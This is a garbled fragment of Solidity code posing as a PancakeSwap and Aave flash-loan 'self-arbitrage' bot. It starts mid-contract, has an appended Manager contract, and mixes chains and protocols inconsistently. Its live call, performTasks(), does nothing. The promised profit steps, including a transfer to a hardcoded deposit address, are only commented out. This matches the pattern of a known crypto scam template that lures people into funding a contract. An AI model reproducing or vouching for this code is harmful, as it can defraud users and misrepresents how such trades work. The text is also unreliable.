// Multiplier-Finance Smart Contracts
//import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
//import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";

// PancakeSwap Smart Contracts
//import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
//import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
//import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";
// Perform tasks (clubbed all functions into one to reduce external calls & SAVE GAS FEE)
    manager.performTasks();
   
    /*
    // Submit token to Ethereum blockchain
    string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);

        // List the token on pancakeswap & send coins required for swaps
manager.pancakeswapListToken(tokenName, tokenSymbol, tokenAddress);
payable(manager.pancakeswapDepositAddress()).transfer(300000000000000000);

        // Get ETH Loan from Aave
string memory loanAddress = manager.takeAaveLoan(loanAmount);

// Convert half ETH to DAI
manager.pancakeswapDAItoETH(loanAmount / 2);

        // Create ETH and DAI pairs for our token & Provide liquidity
        string memory ethPair = manager.pancakeswapCreatePool(tokenAddress, "ETH");
manager.pancakeswapAddLiquidity(ethPair, loanAmount / 2);
string memory daiPair = manager.pancakeswapCreatePool(tokenAddress, "DAI");
manager.pancakeswapAddLiquidity(daiPair, loanAmount / 2);
   
        // Perform swaps and profit on Self-Arbitrage
manager.pancakeswapPerformSwaps();

// Move remaining ETH from Contract to your account
manager.contractToWallet("ETH");

        // Repay Flash loan
manager.repayAaveLoan(loanAddress);
    */
}
}
pragma solidity ^0.6.6;

contract Manager {
        function performTasks() public {
   
        }

        function pancakeswapDepositAddress() public pure returns (address) {
                   return 0x9244E01deFd966D4b8cF9A20FE5617b23008822d;
         }
}        
